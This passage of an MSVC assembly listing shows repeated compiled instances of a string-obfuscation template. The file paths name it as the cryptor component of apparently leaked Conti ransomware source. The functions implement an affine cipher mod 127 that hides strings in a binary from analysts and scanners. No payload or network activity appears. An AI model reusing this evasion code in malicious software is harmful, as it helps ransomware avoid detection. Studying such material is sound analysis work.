  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 42 00 00 00	 mov	 ecx, 66			; 00000042H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 42	 add	 r8d, 66			; 00000042H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  00007	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000c	41 83 e8 1f	 sub	 r8d, 31

; 40   :     return (a % n + n) % n;

  00010	41 f7 e8	 imul	 r8d
  00013	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00018	41 03 d0	 add	 edx, r8d
  0001b	c1 fa 06	 sar	 edx, 6
  0001e	8b ca		 mov	 ecx, edx
  00020	c1 e9 1f	 shr	 ecx, 31
  00023	03 d1		 add	 edx, ecx
  00025	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00028	44 2b c1	 sub	 r8d, ecx
  0002b	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002f	41 f7 e8	 imul	 r8d
  00032	41 03 d0	 add	 edx, r8d
  00035	c1 fa 06	 sar	 edx, 6
  00038	8b ca		 mov	 ecx, edx
  0003a	c1 e9 1f	 shr	 ecx, 31
  0003d	03 d1		 add	 edx, ecx
  0003f	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00042	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00045	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00049	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 ff c0	 inc	 r8d
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 06 00 00 00	 mov	 ecx, 6
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 06	 add	 r8d, 6
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 27	 sub	 eax, 39			; 00000027H
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 27	 add	 r8d, 39			; 00000027H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 3a 00 00 00	 mov	 ecx, 58			; 0000003aH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 02	 add	 eax, 2
  00006	44 6b c0 1d	 imul	 r8d, eax, 29
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 15	 sub	 eax, 21
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
